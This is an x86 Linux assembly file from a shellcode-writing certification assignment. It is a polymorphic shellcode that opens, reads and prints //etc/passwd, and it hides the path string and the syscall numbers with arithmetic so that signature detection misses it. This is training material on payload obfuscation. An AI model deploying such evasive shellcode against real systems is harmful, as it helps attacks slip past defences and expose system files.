; Filename:	tiny_read_poly.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #6 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555 


global _start

section .text

_start:
	; xor ecx, ecx 		
	; mul ecx
	mov ebx, eax		; alterantive way to clear the eax register
	xor eax, ebx
	
	; mov al,0x5		; attempt to mask the syscall number
	push 0x5
	pop eax
	
	; push ecx
	mov dword [esp-4], ecx  ; instead of push ecx to the stack we can move to the desired location
	sub esp, 0x4		; note the stack pointer will need to be manually adjusted
	
	; push dword 0x64777373
	mov esi, 0x53666262	; used add and sub instructions to hide the string //etc/passwd
	add esi, 0x11111111
	push esi

	; push dword 0x61702f63
	sub esi, 0x3074410
	push esi
	
	; push dword 0x74652f2f
	add esi, 0x12f4ffcc
	push esi 
	
	mov ebx,esp
	int 0x80
	xchg eax,ebx
	xchg eax,ecx
	
	; mov al,0x3	
	push 0x3		; attempt to mask the syscall number
	pop eax

	xor edx,edx
	
	; mov dx,0xfff
	; inc edx
	mov dx, 0xffa		; attempt to hide the referencing PAGE_SIZE (4096)
	add edx, 0x6
	
	int 0x80
	xchg eax,edx
	xor eax,eax
	
	; mov al,0x4
	push 0x4		; attempt to mask the syscall number
	pop eax

	; mov bl,0x1
	mov ebx, eax
	sub ebx, 0x3
		
	int 0x80
	xchg eax,ebx
	int 0x80
